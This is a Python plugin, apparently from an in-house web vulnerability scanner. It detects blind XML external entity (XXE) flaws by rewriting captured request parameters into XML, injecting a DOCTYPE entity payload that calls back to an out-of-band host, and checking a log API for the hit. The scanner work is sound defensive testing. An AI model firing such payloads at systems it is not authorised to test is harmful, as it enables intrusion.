#!/ usr/bin/env
# coding=utf-8
#
# Copyright 2019 ztosec & https://www.zto.com/
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
"""
author: b5mali4
"""
import ssl
import urllib3

urllib3.disable_warnings()
import json
import requests
from urllib import parse
from common import http_util
from plugins.base.vuln_enum import VulnType
from plugins.base.base_checker import BaseChecker


class Checker(BaseChecker):
    def check_logic(self, request_raw):
        """
        xpath http://www.freebuf.com/sectool/169122.html
        xpath http://www.freebuf.com/articles/web/23184.html
        检测思路如下:
        1.抓取到请求，如果是get请求,那么将参数的值设置为<!DOCTYPE example [<!ENTITY % xxe SYSTEM "http://127.0.0.1:2334">%xxe;]>
        2.查看weblog中的请求是不是已经接收到了
        3.如果是post，那么将content-type  设置为xml,并且将post的数据(可能是json或者普通data)等价转换成xml并加入<!DOCTYPE filed SYSTEM "http://127.0.0.1/xxe.txt"> 注意要使用filed这个参数
        4.如果是get,可以将请求转换成post再进行3的操作
        
        post字段转换流程，对于字段urlencode name=admin&password=admin 转换成 <name>admin</name><password>admin</password>
        对于json格式{"user": {"name": "admin", "password": "admin"}} 转换成 <user><name>admin</name><password>admin</password></user>
        对于xml格式不做任何转换，如 <name>admin</name><password>admin</password>，直接添加<!DOCTYPE example [<!ENTITY % xxe SYSTEM "http://127.0.0.1:2334">%xxe;]>
        
        # 这里有一个坑, nginx获取请求body的时候会将 <root></root> 变成 {"<root>23333<\/root>": true}
        :param package: 
        :return: 
        """
        http_method = str(request_raw["method"]).lower()
        temp_url = str(request_raw["url"]).strip()
        temp_headers = http_util.header_to_lowercase(json.loads(request_raw['headers']))
        content_type = temp_headers[
            "content-type"] if temp_headers is not None and http_util.ContentType.NAME.lower() in temp_headers else None
        temp_data = request_raw['data'] if "data" in request_raw else None
        # 获取检测api
        blind_poc, check_blind_poc_url, hunter_log_api_token = self.generate_blind_poc()
        if not blind_poc["data"]:
            return

        if blind_poc["type"] == "dns":
            attack_payload = "http://%s" % (blind_poc["data"])  # 得到的是一个域名，域名前缀为uuid
        elif blind_poc["type"] == "socket":
            attack_payload = "http://%s:%s/%s" % (
                blind_poc["data"]["host"], blind_poc["data"]["port"], blind_poc["data"]["uuid"])

        xml_poc = parse.quote('<?xml version="1.0" encoding="utf-8"?>'
                              '<!DOCTYPE hunter [<!ENTITY % xxe SYSTEM "{attack_payload}">%xxe;]>'.format(
            attack_payload=attack_payload))

        try:
            payload = self.get_parser_class(request_raw).add_poc_data(url=temp_url, data=temp_data,
                                                                      http_method=http_method,
                                                                      content_type=content_type, poc=xml_poc)
            requests.request(method=payload["http_method"], url=payload["url"], data=payload["data"],
                             headers=temp_headers, timeout=5, verify=False)
        except Exception:
            pass
        req = requests.get(check_blind_poc_url, headers={"token": hunter_log_api_token}, timeout=5)
        if req:
            response = req.json()
            if "status" in response and response["status"] == 200:
                self.result['status'] = True
                self.result['info'] = '%s 存在一个xxe漏洞' % request_raw['url']
                self.result['payload'] = payload

    def init_plugin_info(self):
        tag = "owasp"
        name = "xxe"
        imp_version = "所有版本"
        author = "b5mali4"
        description = "由于xml解析方式不当造成xxe漏洞,参考链接http://wiki.dev.ztosys.com/pages/viewpage.action?pageId=21732597"
        repair = "禁用外部实体的方法"
        type = VulnType.XXE
        temp_info = {"repair": repair, "name": name, "type": type, "description": description,
                     "imp_version": imp_version, "author": author, "tag": tag}
        self.info = dict(self.info, **temp_info)
